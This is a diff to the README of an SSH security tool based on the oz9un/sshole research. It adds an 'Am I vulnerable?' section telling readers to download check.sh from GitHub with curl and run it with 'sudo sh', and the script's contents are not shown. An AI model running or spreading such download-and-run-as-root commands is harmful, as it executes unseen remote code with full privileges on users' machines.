@@ -6,6 +6,12 @@ Based on the research and original repository by [oz9un/sshole](https://github.c
 
 ---
 
+## ⚠ Am I vulnerable?
+
+```bash
+curl -sO https://raw.githubusercontent.com/oz9un/sshole/main/check.sh
+sudo sh check.sh```
+
 ## ⚙️ Prerequisites
 
 Make sure you have Python 3.x installed on your system. This tool requires the `paramiko` library for handling SSH connections.
